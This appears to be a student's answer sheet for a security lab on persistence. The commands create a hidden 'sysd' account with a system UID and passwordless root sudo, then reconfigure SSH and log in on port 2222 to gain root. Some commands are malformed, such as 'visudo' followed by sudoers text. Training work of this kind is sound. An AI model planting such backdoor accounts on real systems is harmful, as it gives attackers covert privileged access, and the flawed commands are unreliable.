Step 1: Shadow People

Create a secret user named sysd. Make sure this user doesn't have a home folder created:

Your solution command here - useradd -rMo -u 600 sysd
Give your secret user a password:

Your solution command here - passwd sysd
Give your secret user a system UID < 1000:

Your solution command here - usermod -u 600 sysd
Give your secret user the same GID:

Your solution command here - groupmod -g 600 sysd
System_ID
Give your secret user full sudo access without the need for a password:

Your solution command here - visudo sysd ALL=(ALL:ALL) NOPASSWD:ALL
Test that sudo access works without your password:

Your bash commands here - cat /etc/sudoers | grep -i sysd | awk '{ print $3 }'
Root_Access
Step 2: Smooth Sailing

Edit the sshd_config file:

Your bash commands here - sudo nano /etc/ssh/sshd_config

Step 3: Testing Your Configuration Update

Restart the SSH service:

Your solution command here - systemctl restart ssh.service
Exit the root account:

Your solution command here - exit
SSH to the target machine using your sysd account and port 2222:

Your solution command here - ssh sysd@192.168.6.105 -p 2222
Use sudo to switch to the root user:

Your solution command here - sudo su
Step 4: Crack All the Passwords

SSH back to the system using your sysd account and port 2222:

Your solution command here - ssh sysd@192.168.6.105 -p 2222
